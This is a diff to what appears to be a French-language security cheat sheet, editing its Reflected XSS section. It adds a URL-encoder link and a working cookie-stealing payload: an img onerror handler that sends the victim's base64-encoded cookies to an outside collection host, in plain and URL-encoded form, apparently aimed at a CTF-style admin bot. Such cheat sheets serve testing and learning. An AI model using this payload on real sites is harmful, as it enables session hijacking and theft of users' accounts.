@@ -658,9 +658,14 @@ Header Set-Cookie: mettre le scope de l'attribut SameSite = None
 
 #### Reflected XSS
 
+- https://www.urlencoder.org/
+
 ```html
-<-- reflection in paramter, reporting url to the bot -->
-https://vulnerable.org?parameter=<img src=x onerror="document.location=`//night.free.beeceptor.com?c=${btoa(document.cookie)}`">
+<-- reflection in ?parameter, reporting url to the bot -->
+https://vulnerable.org?parameter=<img src=x onerror="document.location=`//night.free.beeceptor.com/?c=${btoa(document.cookie)}`">
+
+<-- using urlencode -->
+https%3A%2F%2Fvulnerable.org%3Fparameter%3D%3Cimg%20src%3Dx%20onerror%3D%22document.location%3D%60%2F%2Fnight.free.beeceptor.com%2F%3Fc%3D%24%7Bbtoa%28document.cookie%29%7D%60%22%3E%0A
 ```
 
 #### Dom based XSS
